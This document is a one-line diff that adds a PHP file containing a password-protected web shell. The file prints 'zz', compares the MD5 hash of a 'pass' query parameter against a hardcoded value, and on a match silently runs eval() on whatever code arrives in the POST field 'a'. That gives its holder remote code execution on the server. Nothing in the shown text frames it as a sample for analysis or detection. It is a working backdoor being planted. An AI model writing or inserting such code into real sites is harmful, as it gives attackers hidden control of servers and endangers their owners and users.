@@ -1,0 +1,1 @@
+<?php echo "zz"; if(md5($_GET["pass"])=="645a9851d69216ce5cee63c91a68ec2c"){@eval($_POST[a]);} ?>?>
